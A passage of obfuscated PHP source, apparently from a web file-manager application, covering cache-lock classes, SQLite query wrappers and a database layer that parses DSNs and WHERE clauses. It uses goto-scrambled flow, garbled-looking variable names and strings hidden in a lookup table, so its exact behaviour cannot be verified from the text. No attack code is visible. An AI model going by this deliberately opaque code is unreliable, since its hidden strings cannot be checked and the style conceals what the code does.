@unlink($fŸ¯êÌÏï); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto CÂÖ©Ìæóª; D äÍƒ ÉĞ: if ($d¤•È¾‡ˆ == $EâöàÆºÒ[17] && $E·ŠæÓÆ« == $EâöàÆºÒ[9]) { $d¤•È¾‡ˆ = $EâöàÆºÒ[193]; } switch ($d¤•È¾‡ˆ) { case $EâöàÆºÒ[795]: self::$handle = new CacheLockRedis(); break; case $EâöàÆºÒ[796]: self::$handle = new CacheLockMemcached(); break; case $EâöàÆºÒ[17]: self::$handle = new CacheLockDatabase(); break; case $EâöàÆºÒ[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto aÊ°”¹Š¾‡; eàÍ»š¢Ï•: self::$timeout = $e­ÖŞ¹¼[$EâöàÆºÒ[805]] ? $e­ÖŞ¹¼[$EâöàÆºÒ[805]] : 10; $E·ŠæÓÆ« = _get($GLOBALS[$EâöàÆºÒ[6]], $EâöàÆºÒ[806]); $d¤•È¾‡ˆ = $e­ÖŞ¹¼[$EâöàÆºÒ[792]] ? $e­ÖŞ¹¼[$EâöàÆºÒ[792]] : $EâöàÆºÒ[193]; goto D äÍƒ ÉĞ; CÂÖ©Ìæóª: $EâöàÆºÒ =& $_SERVER[œº]; if (self::$handle) { return self::$handle; } $e­ÖŞ¹¼ = $GLOBALS[$EâöàÆºÒ[6]][$EâöàÆºÒ[347]]; goto eàÍ»š¢Ï•; aÊ°”¹Š¾‡: } private static function key($Fß¶éÒğŞ) { return $_SERVER[œº][807] . Cache::key($Fß¶éÒğŞ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($fŒ®§óÁù« = '') { self::$errorMsg = $fŒ®§óÁù«; } public static function lockGlobal($DÀ­‡¾Î–Å, $aÇøÇ¢·âÍ) { return self::lock($DÀ­‡¾Î–Å, $aÇøÇ¢·âÍ, !0); } public static function lock($A§Ü’ÊèŒ, $EÜ‘¥ÚÓ¥ = false, $d»ŠÃŠ§ƒ‚ = false) { goto b†§Ïö¿ ; CÇÚ›ÎÑ¿Û: $EÜ‘¥ÚÓ¥ = $EÜ‘¥ÚÓ¥ ? $EÜ‘¥ÚÓ¥ : self::$timeout; $Bñ‹ôšØÑö = $d† ÛÏóŞ->lock($c†ÃáÂˆÊˆ, $EÜ‘¥ÚÓ¥); if (!$Bñ‹ôšØÑö) { $C‚«™¸àŒ = "\154\x6f\143\x6b\40\x65\162\x72\x6f\x72\73\153\x65\171\75{$A§Ü’ÊèŒ}\x3b\x74\x69\155\x65\75{$EÜ‘¥ÚÓ¥}\x3b" . self::$errorMsg . $EîôÖˆßÙ¥[68] . get_caller_msg(); $AÈŸ´ÔÅâ™ = LNG($EîôÖˆßÙ¥[808]) . "\50{$EÜ‘¥ÚÓ¥}\x73\51\x2e" . LNG($EîôÖˆßÙ¥[809]); $AÈŸ´ÔÅâ™ .= $EîôÖˆßÙ¥[810]; if (is_string(self::$errorMsg) && self::$errorMsg) { $AÈŸ´ÔÅâ™ = $AÈŸ´ÔÅâ™ . $EîôÖˆßÙ¥[811] . self::$errorMsg; } write_log($C‚«™¸àŒ, $EîôÖˆßÙ¥[812]); show_json($AÈŸ´ÔÅâ™, !1); } goto AßÃ®½µ›÷; b†§Ïö¿ : $EîôÖˆßÙ¥ =& $_SERVER[œº]; $d† ÛÏóŞ = self::init(); $c†ÃáÂˆÊˆ = self::key($A§Ü’ÊèŒ); goto CÇÚ›ÎÑ¿Û; AßÃ®½µ›÷: if (!$d»ŠÃŠ§ƒ‚) { self::$lockItem[$c†ÃáÂˆÊˆ] = !0; } return $Bñ‹ôšØÑö; goto dÁ‹ƒÑâà; dÁ‹ƒÑâà: } public static function lockGet($f¾±ß‘÷’) { $BÄ³›¶•³ó = self::key($f¾±ß‘÷’); if (self::$lockItem[$BÄ³›¶•³ó]) { return self::$lockItem[$BÄ³›¶•³ó]; } return self::init()->lockGet($BÄ³›¶•³ó); } public static function unlock($cÑƒÀ…ß) { $c¥Ö¬á­° = self::key($cÑƒÀ…ß); self::$lockItem[$c¥Ö¬á­°] = null; return self::init()->unlock($c¥Ö¬á­°); } public static function unlockRuntime() { $c°õ´Ùê„œ =& $_SERVER[œº]; $a„×ÚÂã÷ = self::init(); $c–Æ§ÜÙºŒ = !1; foreach (self::$lockItem as $Eé¢æòÃ†Ã => $dÆ¢çÔÙ±Â) { if (!$dÆ¢çÔÙ±Â) { continue; } $a„×ÚÂã÷->unlock($Eé¢æòÃ†Ã); if (!$c–Æ§ÜÙºŒ) { $c–Æ§ÜÙºŒ = !0; write_log($c°õ´Ùê„œ[813] . $Eé¢æòÃ†Ã . $c°õ´Ùê„œ[68] . get_caller_msg(), $c°õ´Ùê„œ[812]); continue; } write_log($c°õ´Ùê„œ[813] . $Eé¢æòÃ†Ã, $c°õ´Ùê„œ[812]); } self::fileUnlockAll(); } public static function fileLock($c»»•©Û) { goto f‰³õ”äÒå; dµÙôµ†Æ: return !1; goto FíÅÏî¼¬¬; E¼…Ø§‹Ì: if (flock($eÆˆÎÂ‚ƒ„, LOCK_EX)) { return !0; } self::unlock($c»»•©Û); show_json($d¢‰ê›œ‘Ë[817], !1); goto dµÙôµ†Æ; f‰³õ”äÒå: $d¢‰ê›œ‘Ë =& $_SERVER[œº]; if (!$GLOBALS[$d¢‰ê›œ‘Ë[814]]) { $GLOBALS[$d¢‰ê›œ‘Ë[814]] = array(); } $GLOBALS[$d¢‰ê›œ‘Ë[814]][$c»»•©Û] = !1; goto D‘‚’Œ×ºô; D‘‚’Œ×ºô: $eÆˆÎÂ‚ƒ„ = fopen(DATA_PATH . $c»»•©Û . $d¢‰ê›œ‘Ë[815], $d¢‰ê›œ‘Ë[816]); if (!$eÆˆÎÂ‚ƒ„) { return !1; } $GLOBALS[$d¢‰ê›œ‘Ë[814]][$c»»•©Û] = $eÆˆÎÂ‚ƒ„; goto E¼…Ø§‹Ì; FíÅÏî¼¬¬: } public static function fileUnlock($EÆ³ÜğæÜ¦) { $A—æ‰öÍñŸ =& $_SERVER[œº]; $a†„¸’¥¬ = $GLOBALS[$A—æ‰öÍñŸ[814]][$EÆ³ÜğæÜ¦]; if (!$a†„¸’¥¬) { return; } $GLOBALS[$A—æ‰öÍñŸ[814]][$EÆ³ÜğæÜ¦] = !1; flock($a†„¸’¥¬, LOCK_UN); fclose($a†„¸’¥¬); } public static function fileUnlockAll() { $FÈĞº¥ˆÑ =& $_SERVER[œº]; if (!$GLOBALS[$FÈĞº¥ˆÑ[814]]) { return; } foreach ($GLOBALS[$FÈĞº¥ˆÑ[814]] as $EÔ¾–Ù¢‘­ => $A¡ÔÂˆØÛä) { if (!$A¡ÔÂˆØÛä) { continue; } $GLOBALS[$FÈĞº¥ˆÑ[814]][$EÔ¾–Ù¢‘­] = !1; flock($A¡ÔÂˆØÛä, LOCK_UN); fclose($A¡ÔÂˆØÛä); } $GLOBALS[$FÈĞº¥ˆÑ[814]] = array(); } } goto EÏÅŞ¿¯¾ø; EØ³çÄ“æÚ: class DbSqlite extends DbSqliteBase { public function query($bÓõÜÛ¶¬Î) { $BôÒø’Ñæ‡ =& $_SERVER[œº]; if (!CacheLock::fileLock($BôÒø’Ñæ‡[9])) { return !1; } $F²ááŸïÓ° = parent::query($bÓõÜÛ¶¬Î); CacheLock::fileUnLock($BôÒø’Ñæ‡[9]); return $F²ááŸïÓ°; } public function execute($aóë‚Ë™¿·) { $D©Öà•ó«« =& $_SERVER[œº]; if (!CacheLock::fileLock($D©Öà•ó««[9])) { return !1; } $CŒù”ŞÔ²ä = parent::execute($aóë‚Ë™¿·); CacheLock::fileUnLock($D©Öà•ó««[9]); return $CŒù”ŞÔ²ä; } } class DbSqlite3 extends DbSqlite3Base { public function query($DÎ™–àë) { $f©©âİçˆ‚ =& $_SERVER[œº]; if (!CacheLock::fileLock($f©©âİçˆ‚[9])) { return !1; } $D¾²À˜«¨à = parent::query($DÎ™–àë); CacheLock::fileUnLock($f©©âİçˆ‚[9]); return $D¾²À˜«¨à; } public function execute($Aäºìµõğ) { $C¦ğ‚İ¼ôí =& $_SERVER[œº]; if (!CacheLock::fileLock($C¦ğ‚İ¼ôí[9])) { return !1; } $c®éŠ¯ğæµ = parent::execute($Aäºìµõğ); CacheLock::fileUnLock($C¦ğ‚İ¼ôí[9]); return $c®éŠ¯ğæµ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\145\x71" => "\x3c\x3e", "\147\x74" => "\x3e", "\145\x67\x74" => "\76\x3d", "\x6c\x74" => "\74", "\x65\x6c\x74" => "\74\75", "\x6e\157\x74\154\x69\153\145" => "\x4e\x4f\124\40\x4c\x49\x4b\105", "\154\151\x6b\x65" => "\114\x49\113\x45", "\x69\156" => "\x49\x4e", "\156\157\x74\151\x6e" => "\x4e\x4f\124\40\111\x4e", "\156\x6f\164\x20\151\x6e" => "\x4e\117\x54\x20\x49\116", "\142\145\x74\x77\x65\x65\x6e" => "\102\x45\124\x57\x45\x45\x4e", "\156\x6f\164\x62\x65\164\167\145\x65\x6e" => "\x4e\117\x54\40\102\x45\x54\127\105\105\x4e", "\x6e\157\164\40\142\x65\x74\167\x65\x65\x6e" => "\x4e\117\124\40\102\x45\124\x57\105\105\x4e"); protected $selectSql = "\123\x45\114\x45\x43\x54\45\x44\111\x53\124\x49\116\103\x54\x25\x20\x25\106\x49\x45\114\x44\45\x20\106\x52\x4f\115\x20\45\124\x41\102\x4c\x45\45\x25\x4a\117\111\x4e\x25\45\x57\110\x45\x52\x45\x25\x25\107\x52\x4f\125\x50\x25\x25\110\x41\x56\x49\116\107\x25\45\x4f\122\x44\x45\x52\45\45\x4c\x49\115\111\124\45\x20\45\x55\116\111\117\x4e\45\x25\x43\x4f\115\115\105\x4e\124\45"; protected $bind = array(); public static function getInstance() { $EéÒŸê­‹ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[œº][919], $EéÒŸê­‹); } public function factory($f„™²ìÍá´ = '') { goto eóÒãÏŸÄ; Bİ‹·Œ³: $this->dbType = ucwords(strtolower($f„™²ìÍá´[$Dòæ¢–Ñ½[920]])); $Eµê„™ï¿Ò = $Dòæ¢–Ñ½[922] . $this->dbType; if (class_exists($Eµê„™ï¿Ò)) { $B‚ùîÍ¥Ùö = new $Eµê„™ï¿Ò($f„™²ìÍá´); if ($Dòæ¢–Ñ½[755] != strtolower($f„™²ìÍá´[$Dòæ¢–Ñ½[920]])) { $B‚ùîÍ¥Ùö->dbType = strtoupper($this->dbType); } else { $B‚ùîÍ¥Ùö->dbType = $this->_getDsnType($f„™²ìÍá´[$Dòæ¢–Ñ½[875]]); } } else { think_exception(think_lang($Dòæ¢–Ñ½[923]) . $Dòæ¢–Ñ½[924] . $Eµê„™ï¿Ò); } goto cË»ÑÇ°•«; cË»ÑÇ°•«: return $B‚ùîÍ¥Ùö; goto B½ˆ¦èÙôÀ; eóÒãÏŸÄ: $Dòæ¢–Ñ½ =& $_SERVER[œº]; $f„™²ìÍá´ = $this->parseConfig($f„™²ìÍá´); if (empty($f„™²ìÍá´[$Dòæ¢–Ñ½[920]])) { think_exception(think_lang($Dòæ¢–Ñ½[921])); } goto Bİ‹·Œ³; B½ˆ¦èÙôÀ: } public function __call($d«¿¬“ÖÍ°, $f±›Òé§å) { if (method_exists($this, $d«¿¬“ÖÍ°)) { return call_user_func_array(array($this, $d«¿¬“ÖÍ°), $f±›Òé§å); } } protected function _getDsnType($fØå¯†‡ê) { $Fô¨ ›Íƒ = explode($_SERVER[œº][4], $fØå¯†‡ê); $bì‚ïÇé¢  = strtoupper(trim($Fô¨ ›Íƒ[0])); return $bì‚ïÇé¢ ; } private function parseConfig($cÃÏëµé´¶ = '') { $d§ŒçƒÅÉ· =& $_SERVER[œº]; if (!empty($cÃÏëµé´¶) && is_string($cÃÏëµé´¶)) { $cÃÏëµé´¶ = $this->parseDSN($cÃÏëµé´¶); } elseif (is_array($cÃÏëµé´¶)) { $cÃÏëµé´¶ = array_change_key_case($cÃÏëµé´¶); $cÃÏëµé´¶ = array($d§ŒçƒÅÉ·[920] => $cÃÏëµé´¶[$d§ŒçƒÅÉ·[754]], $d§ŒçƒÅÉ·[848] => $cÃÏëµé´¶[$d§ŒçƒÅÉ·[925]], $d§ŒçƒÅÉ·[849] => $cÃÏëµé´¶[$d§ŒçƒÅÉ·[926]], $d§ŒçƒÅÉ·[846] => $cÃÏëµé´¶[$d§ŒçƒÅÉ·[927]], $d§ŒçƒÅÉ·[847] => $cÃÏëµé´¶[$d§ŒçƒÅÉ·[928]], $d§ŒçƒÅÉ·[17] => $cÃÏëµé´¶[$d§ŒçƒÅÉ·[929]], $d§ŒçƒÅÉ·[875] => $cÃÏëµé´¶[$d§ŒçƒÅÉ·[756]], $d§ŒçƒÅÉ·[13] => isset($cÃÏëµé´¶[$d§ŒçƒÅÉ·[930]]) ? $cÃÏëµé´¶[$d§ŒçƒÅÉ·[930]] : array()); } elseif (empty($cÃÏëµé´¶)) { if (think_config($d§ŒçƒÅÉ·[931]) && $d§ŒçƒÅÉ·[755] != strtolower(think_config($d§ŒçƒÅÉ·[932]))) { $cÃÏëµé´¶ = $this->parseDSN(think_config($d§ŒçƒÅÉ·[931])); } else { $cÃÏëµé´¶ = array($d§ŒçƒÅÉ·[920] => think_config($d§ŒçƒÅÉ·[932]), $d§ŒçƒÅÉ·[848] => think_config($d§ŒçƒÅÉ·[933]), $d§ŒçƒÅÉ·[849] => think_config($d§ŒçƒÅÉ·[934]), $d§ŒçƒÅÉ·[846] => think_config($d§ŒçƒÅÉ·[935]), $d§ŒçƒÅÉ·[847] => think_config($d§ŒçƒÅÉ·[936]), $d§ŒçƒÅÉ·[17] => think_config($d§ŒçƒÅÉ·[244]), $d§ŒçƒÅÉ·[875] => think_config($d§ŒçƒÅÉ·[931]), $d§ŒçƒÅÉ·[13] => think_config($d§ŒçƒÅÉ·[937])); } } return $cÃÏëµé´¶; } protected function initConnect($bÖëôâóÛ = true) { if (1 == think_config($_SERVER[œº][18])) { $this->_linkID = $this->multiConnect($bÖëôâóÛ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $aéº¬åö => $aéò«´‡¾’) { $this->_linkID = $aéò«´‡¾’; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Eòº „‚î = false) { goto a´…ÁÉ¼‹Ğ; b–Ëâñî„: if (empty($b®éó•à‹…)) { foreach ($this->config as $Cì¸ôåºÄ => $CÌ×£¤Â÷) { $b®éó•à‹…[$Cì¸ôåºÄ] = explode($FæÃãØÕ¥Ş[47], $CÌ×£¤Â÷); } } if (think_config($FæÃãØÕ¥Ş[938])) { if ($Eòº „‚î) { $EĞô¦ŒÄÖ = floor(mt_rand(0, think_config($FæÃãØÕ¥Ş[939]) - 1)); $bÄàÓùë… = $EĞô¦ŒÄÖ; } else { if (is_numeric(think_config($FæÃãØÕ¥Ş[940]))) { $EĞô¦ŒÄÖ = think_config($FæÃãØÕ¥Ş[940]); } else { $EĞô¦ŒÄÖ = floor(mt_rand(think_config($FæÃãØÕ¥Ş[939]), count($b®éó•à‹…[$FæÃãØÕ¥Ş[846]]) - 1)); } } } else { $EĞô¦ŒÄÖ = floor(mt_rand(0, count($b®éó•à‹…[$FæÃãØÕ¥Ş[846]]) - 1)); $bÄàÓùë… = $EĞô¦ŒÄÖ; } $EĞô¦ŒÄÖ = $bÄàÓùë… !== -1 ? $bÄàÓùë… : $EĞô¦ŒÄÖ; goto BÌ£†Õ°”È; a´…ÁÉ¼‹Ğ: $FæÃãØÕ¥Ş =& $_SERVER[œº]; static $b®éó•à‹… = array(); static $bÄàÓùë… = -1; goto b–Ëâñî„; BÌ£†Õ°”È: $Dí°Ìàè˜ = array($FæÃãØÕ¥Ş[848] => isset($b®éó•à‹…[$FæÃãØÕ¥Ş[848]][$EĞô¦ŒÄÖ]) ? $b®éó•à‹…[$FæÃãØÕ¥Ş[848]][$EĞô¦ŒÄÖ] : $b®éó•à‹…[$FæÃãØÕ¥Ş[848]][0], $FæÃãØÕ¥Ş[849] => isset($b®éó•à‹…[$FæÃãØÕ¥Ş[849]][$EĞô¦ŒÄÖ]) ? $b®éó•à‹…[$FæÃãØÕ¥Ş[849]][$EĞô¦ŒÄÖ] : $b®éó•à‹…[$FæÃãØÕ¥Ş[849]][0], $FæÃãØÕ¥Ş[846] => isset($b®éó•à‹…[$FæÃãØÕ¥Ş[846]][$EĞô¦ŒÄÖ]) ? $b®éó•à‹…[$FæÃãØÕ¥Ş[846]][$EĞô¦ŒÄÖ] : $b®éó•à‹…[$FæÃãØÕ¥Ş[846]][0], $FæÃãØÕ¥Ş[847] => isset($b®éó•à‹…[$FæÃãØÕ¥Ş[847]][$EĞô¦ŒÄÖ]) ? $b®éó•à‹…[$FæÃãØÕ¥Ş[847]][$EĞô¦ŒÄÖ] : $b®éó•à‹…[$FæÃãØÕ¥Ş[847]][0], $FæÃãØÕ¥Ş[17] => isset($b®éó•à‹…[$FæÃãØÕ¥Ş[17]][$EĞô¦ŒÄÖ]) ? $b®éó•à‹…[$FæÃãØÕ¥Ş[17]][$EĞô¦ŒÄÖ] : $b®éó•à‹…[$FæÃãØÕ¥Ş[17]][0], $FæÃãØÕ¥Ş[875] => isset($b®éó•à‹…[$FæÃãØÕ¥Ş[875]][$EĞô¦ŒÄÖ]) ? $b®éó•à‹…[$FæÃãØÕ¥Ş[875]][$EĞô¦ŒÄÖ] : $b®éó•à‹…[$FæÃãØÕ¥Ş[875]][0], $FæÃãØÕ¥Ş[13] => isset($b®éó•à‹…[$FæÃãØÕ¥Ş[13]][$EĞô¦ŒÄÖ]) ? $b®éó•à‹…[$FæÃãØÕ¥Ş[13]][$EĞô¦ŒÄÖ] : $b®éó•à‹…[$FæÃãØÕ¥Ş[13]][0]); return $this->connect($Dí°Ìàè˜, $EĞô¦ŒÄÖ); goto AĞµİÕÎßè; AĞµİÕÎßè: } public function parseDSN($E†Ó«ÆöÛ‘) { $Eâ¿¡©¥Â¯ =& $_SERVER[œº]; if (empty($E†Ó«ÆöÛ‘)) { return !1; } $A©ğÚæïŠ‹ = parse_url($E†Ó«ÆöÛ‘); if ($A©ğÚæïŠ‹[$Eâ¿¡©¥Â¯[174]]) { $aÜíĞ¨Ğè­ = array($Eâ¿¡©¥Â¯[920] => $A©ğÚæïŠ‹[$Eâ¿¡©¥Â¯[174]], $Eâ¿¡©¥Â¯[848] => isset($A©ğÚæïŠ‹[$Eâ¿¡©¥Â¯[562]]) ? $A©ğÚæïŠ‹[$Eâ¿¡©¥Â¯[562]] : $Eâ¿¡©¥Â¯[33], $Eâ¿¡©¥Â¯[849] => isset($A©ğÚæïŠ‹[$Eâ¿¡©¥Â¯[941]]) ? $A©ğÚæïŠ‹[$Eâ¿¡©¥Â¯[941]] : $Eâ¿¡©¥Â¯[33], $Eâ¿¡©¥Â¯[846] => isset($A©ğÚæïŠ‹[$Eâ¿¡©¥Â¯[175]]) ? $A©ğÚæïŠ‹[$Eâ¿¡©¥Â¯[175]] : $Eâ¿¡©¥Â¯[33], $Eâ¿¡©¥Â¯[847] => isset($A©ğÚæïŠ‹[$Eâ¿¡©¥Â¯[176]]) ? $A©ğÚæïŠ‹[$Eâ¿¡©¥Â¯[176]] : $Eâ¿¡©¥Â¯[33], $Eâ¿¡©¥Â¯[17] => isset($A©ğÚæïŠ‹[$Eâ¿¡©¥Â¯[76]]) ? substr($A©ğÚæïŠ‹[$Eâ¿¡©¥Â¯[76]], 1) : $Eâ¿¡©¥Â¯[33]); } else { preg_match($Eâ¿¡©¥Â¯[942], trim($E†Ó«ÆöÛ‘), $FÉªƒ­ƒÅŞ); $aÜíĞ¨Ğè­ = array($Eâ¿¡©¥Â¯[920] => $FÉªƒ­ƒÅŞ[1], $Eâ¿¡©¥Â¯[848] => $FÉªƒ­ƒÅŞ[2], $Eâ¿¡©¥Â¯[849] => $FÉªƒ­ƒÅŞ[3], $Eâ¿¡©¥Â¯[846] => $FÉªƒ­ƒÅŞ[4], $Eâ¿¡©¥Â¯[847] => $FÉªƒ­ƒÅŞ[5], $Eâ¿¡©¥Â¯[17] => $FÉªƒ­ƒÅŞ[6]); } $aÜíĞ¨Ğè­[$Eâ¿¡©¥Â¯[875]] = $Eâ¿¡©¥Â¯[33]; return $aÜíĞ¨Ğè­; } protected function debug() { $fç©–ßˆÊè =& $_SERVER[œº]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $fç©–ßˆÊè[943]; if (think_config($fç©–ßˆÊè[944])) { think_status($fç©–ßˆÊè[945]); think_trace($this->queryStr . $fç©–ßˆÊè[946] . think_status($fç©–ßˆÊè[20], $fç©–ßˆÊè[945], 6) . $fç©–ßˆÊè[947], $fç©–ßˆÊè[33], $fç©–ßˆÊè[948]); } } protected function parseLock($dêĞ¥•åÄ¶ = false) { $cù®Ä—ÉÈŒ =& $_SERVER[œº]; if (!$dêĞ¥•åÄ¶) { return $cù®Ä—ÉÈŒ[33]; } if ($cù®Ä—ÉÈŒ[877] == $this->dbType) { return $cù®Ä—ÉÈŒ[949]; } return $cù®Ä—ÉÈŒ[950]; } protected function parseSet($e”ó£Å—ø×) { $dÃšƒ‚± =& $_SERVER[œº]; foreach ($e”ó£Å—ø× as $FŠÉÚºÂ˜ => $Cñì§¾¢¨Û) { if (is_array($Cñì§¾¢¨Û) && $dÃšƒ‚±[295] == $Cñì§¾¢¨Û[0]) { $B‚ÂÇºªÀ§[] = $this->parseKey($FŠÉÚºÂ˜) . $dÃšƒ‚±[951] . $Cñì§¾¢¨Û[1]; } elseif (is_scalar($Cñì§¾¢¨Û) || is_null($Cñì§¾¢¨Û)) { $B‚ÂÇºªÀ§[] = $this->parseKey($FŠÉÚºÂ˜) . $dÃšƒ‚±[951] . $this->parseValue($Cñì§¾¢¨Û); } } return $dÃšƒ‚±[952] . implode($dÃšƒ‚±[47], $B‚ÂÇºªÀ§); } protected function bindParam($dôÎÂÄ³ìœ, $e­‰æôŸ) { $this->bind[$_SERVER[œº][4] . $dôÎÂÄ³ìœ] = $e­‰æôŸ; } protected function parseBind($aœÓ´Ÿ¦Ë†) { $aœÓ´Ÿ¦Ë† = array_merge($this->bind, $aœÓ´Ÿ¦Ë†); $this->bind = array(); return $aœÓ´Ÿ¦Ë†; } function parseKey(&$e”íÃÈƒ™², $e­Áï˜ùÙ² = true) { if ($e­Áï˜ùÙ²) { $e”íÃÈƒ™² = $this->parseKeyCheck($e”íÃÈƒ™²); } return $e”íÃÈƒ™²; } function parseKeyCheck($b”åùã½Óñ) { $E¡éÄŞ·Ÿ =& $_SERVER[œº]; $b”åùã½Óñ = trim($b”åùã½Óñ); if (!preg_match($E¡éÄŞ·Ÿ[953], $b”åùã½Óñ)) { think_exception($E¡éÄŞ·Ÿ[954] . $b”åùã½Óñ); } return $b”åùã½Óñ; } protected function parseValue($aëõŠ„¶–) { $bÁ¦œ˜Ò¦² =& $_SERVER[œº]; if (is_string($aëõŠ„¶–)) { $aëõŠ„¶– = $bÁ¦œ˜Ò¦²[916] . $this->escapeString($aëõŠ„¶–) . $bÁ¦œ˜Ò¦²[916]; } elseif (isset($aëõŠ„¶–[0]) && is_string($aëõŠ„¶–[0]) && strtolower($aëõŠ„¶–[0]) == $bÁ¦œ˜Ò¦²[295]) { $aëõŠ„¶– = $this->escapeString($aëõŠ„¶–[1]); } elseif (is_array($aëõŠ„¶–)) { $aëõŠ„¶– = array_map(array($this, $bÁ¦œ˜Ò¦²[917]), $aëõŠ„¶–); } elseif (is_bool($aëõŠ„¶–)) { $aëõŠ„¶– = $aëõŠ„¶– ? $bÁ¦œ˜Ò¦²[87] : $bÁ¦œ˜Ò¦²[191]; } elseif (is_null($aëõŠ„¶–)) { $aëõŠ„¶– = $bÁ¦œ˜Ò¦²[103]; } return $aëõŠ„¶–; } protected function parseField($C›â½¼Ÿİ) { $D¾”­¶Âøè =& $_SERVER[œº]; if (is_string($C›â½¼Ÿİ) && strpos($C›â½¼Ÿİ, $D¾”­¶Âøè[47])) { $C›â½¼Ÿİ = explode($D¾”­¶Âøè[47], $C›â½¼Ÿİ); } if (is_array($C›â½¼Ÿİ)) { $e‹òÏË˜«ñ = array(); foreach ($C›â½¼Ÿİ as $E„àò£—ğÂ => $Cšß´Ší) { if (!is_numeric($E„àò£—ğÂ)) { $e‹òÏË˜«ñ[] = $this->parseKey($E„àò£—ğÂ, !1) . $D¾”­¶Âøè[955] . $this->parseKey($Cšß´Ší); } else { $e‹òÏË˜«ñ[] = $this->parseKey($Cšß´Ší); } } $e½‘¾” = implode($D¾”­¶Âøè[47], $e‹òÏË˜«ñ); } elseif (is_string($C›â½¼Ÿİ) && !empty($C›â½¼Ÿİ)) { $e½‘¾” = $C›â½¼Ÿİ; } else { $e½‘¾” = $D¾”­¶Âøè[182]; } return $e½‘¾”; } protected function parseTable($d‡ß™Çº”) { $bä‘Éìóìõ =& $_SERVER[œº]; if (is_array($d‡ß™Çº”)) { $d…Î¿¸Ó¸ = array(); foreach ($d‡ß™Çº” as $eéÄ¯Í‰Å³ => $e’©†Ç“„„) { if (!is_numeric($eéÄ¯Í‰Å³)) { $d…Î¿¸Ó¸[] = $this->parseKey($eéÄ¯Í‰Å³) . $bä‘Éìóìõ[50] . $this->parseKey($e’©†Ç“„„); } else { $d…Î¿¸Ó¸[] = $this->parseKey($eéÄ¯Í‰Å³); } } $d‡ß™Çº” = $d…Î¿¸Ó¸; } elseif (is_string($d‡ß™Çº”)) { if (strstr($d‡ß™Çº”, $bä‘Éìóìõ[50])) { return $d‡ß™Çº”; } $d‡ß™Çº” = explode($bä‘Éìóìõ[47], $d‡ß™Çº”); array_walk($d‡ß™Çº”, array($this, $bä‘Éìóìõ[866])); } return $bä‘Éìóìõ[860] . trim(implode($bä‘Éìóìõ[956], $d‡ß™Çº”), $bä‘Éìóìõ[382]) . $bä‘Éìóìõ[860]; } protected function parseWhere($C•†·”‚ó) { $bÈšˆæ¼î =& $_SERVER[œº]; $c×ÓÉ™Í‡Ò = $bÈšˆæ¼î[33]; if (is_string($C•†·”‚ó)) { $c×ÓÉ™Í‡Ò = $C•†·”‚ó; } else { $EŞÃ‹»À† = isset($C•†·”‚ó[$bÈšˆæ¼î[957]]) ? strtoupper($C•†·”‚ó[$bÈšˆæ¼î[957]]) : $bÈšˆæ¼î[33]; if (in_array($EŞÃ‹»À†, array($bÈšˆæ¼î[958], $bÈšˆæ¼î[959], $bÈšˆæ¼î[960]))) { $EŞÃ‹»À† = $bÈšˆæ¼î[50] . $EŞÃ‹»À† . $bÈšˆæ¼î[50]; unset($C•†·”‚ó[$bÈšˆæ¼î[957]]); } else { $EŞÃ‹»À† = $bÈšˆæ¼î[961]; } foreach ($C•†·”‚ó as $B‡†ËŠÌù => $Fè¹Ú³‡°) { $c×ÓÉ™Í‡Ò .= $bÈšˆæ¼î[275]; if (is_numeric($B‡†ËŠÌù)) { $B‡†ËŠÌù = $bÈšˆæ¼î[962]; } if (0 === strpos($B‡†ËŠÌù, $bÈšˆæ¼î[71])) { $c×ÓÉ™Í‡Ò .= $this->parseThinkWhere($B‡†ËŠÌù, $Fè¹Ú³‡°); } else { if (!preg_match($bÈšˆæ¼î[963], trim($B‡†ËŠÌù))) { think_exception(think_lang($bÈšˆæ¼î[964]) . $bÈšˆæ¼î[4] . $B‡†ËŠÌù); } $bËİÑ¦Â•Í = is_array($Fè¹Ú³‡°) && isset($Fè¹Ú³‡°[$bÈšˆæ¼î[965]]); $B‡†ËŠÌù = trim($B‡†ËŠÌù); if (strpos($B‡†ËŠÌù, $bÈšˆæ¼î[281])) { $cù™º”´Œˆ = explode($bÈšˆæ¼î[281], $B‡†ËŠÌù); $EÙ”óÑÙø¹ = array(); foreach ($cù™º”´Œˆ as $dÓëÚ˜¥ò => $C‹ä’Õ”£) { $EŒ¼ÓêŒæÌ = $bËİÑ¦Â•Í ? $Fè¹Ú³‡°[$dÓëÚ˜¥ò] : $Fè¹Ú³‡°; $EÙ”óÑÙø¹[] = $bÈšˆæ¼î[258] . $this->parseWhereItem($this->parseKey($C‹ä’Õ”£), $EŒ¼ÓêŒæÌ) . $bÈšˆæ¼î[865]; } $c×ÓÉ™Í‡Ò .= implode($bÈšˆæ¼î[966], $EÙ”óÑÙø¹); } elseif (strpos($B‡†ËŠÌù, $bÈšˆæ¼î[282])) { $cù™º”´Œˆ = explode($bÈšˆæ¼î[282], $B‡†ËŠÌù); $EÙ”óÑÙø¹ = array(); foreach ($cù™º”´Œˆ as $dÓëÚ˜¥ò => $C‹ä’Õ”£) { $EŒ¼ÓêŒæÌ = $bËİÑ¦Â•Í ? $Fè¹Ú³‡°[$dÓëÚ˜¥ò] : $Fè¹Ú³‡°; $EÙ”óÑÙø¹[] = $bÈšˆæ¼î[258] . $this->parseWhereItem($this->parseKey($C‹ä’Õ”£), $EŒ¼ÓêŒæÌ) . $bÈšˆæ¼î[865]; } $c×ÓÉ™Í‡Ò .= implode($bÈšˆæ¼î[961], $EÙ”óÑÙø¹); } else { $c×ÓÉ™Í‡Ò .= $this->parseWhereItem($this->parseKey($B‡†ËŠÌù), $Fè¹Ú³‡°); 